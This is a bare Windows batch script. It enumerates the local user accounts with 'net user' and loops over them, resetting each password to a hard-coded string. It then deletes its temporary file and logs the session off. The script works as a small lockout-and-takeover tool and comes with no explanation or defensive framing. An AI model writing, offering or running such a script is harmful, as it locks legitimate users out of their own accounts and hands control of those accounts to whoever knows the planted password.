@echo off
set Pass="senthur8"
set "x=0"
set filename="o.txt"
net user>>%filename%
set lines_to_skip=4
(
   if %lines_to_skip% gtr 0 for /L %%A in (1,1,%lines_to_skip%) do set /p =
    set /p user[0]=
    set /p user[1]=
    set /p user[2]=
    set /p user[3]=
    set /p user[4]=
    set /p user[5]=
    set /p user[6]=
    set /p user[7]=
    set /p user[8]=
    set /p user[9]=
)<o.txt
setlocal enableDelayedExpansion
:SymLoop
set /a next=%x% + 1
if defined user[%next%] (
    for /F "tokens=1" %%a in ("!user[%x%]!") do (
        net user %%a %Pass%
    )
    set /a "x+=1"
    GOTO :SymLoop
) else (
    GOTO :end
)
:End
del %filename%
shutdown -l